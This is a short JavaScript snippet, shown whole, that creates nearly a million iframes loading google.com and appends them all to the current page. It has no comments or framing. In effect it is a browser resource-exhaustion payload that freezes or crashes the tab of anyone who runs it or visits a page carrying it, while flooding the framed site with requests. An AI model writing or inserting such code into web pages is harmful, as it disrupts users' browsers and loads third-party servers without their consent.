for (let i = 0; i < 999999; i++){
  let p = document.createElement('iframe');
  p.src = 'https://google.com'
  document.body.appendChild(p);
}
